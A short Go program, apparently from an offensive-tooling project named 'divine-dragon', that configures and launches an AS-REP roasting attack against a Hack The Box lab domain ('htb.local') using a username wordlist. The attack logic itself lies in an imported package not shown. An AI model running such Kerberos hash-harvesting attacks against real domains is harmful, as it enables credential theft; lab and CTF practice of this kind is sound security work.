package main

import (
	"divine-dragon/remote_exploit"
)

func main() {
	remote_exploit.SetupASREPRoastingModule("htb.local", "10.129.95.210", false, false, false, "", "remote_exploit/names.txt", "", 10, 0)
	remote_exploit.ASREPRoasting()
}
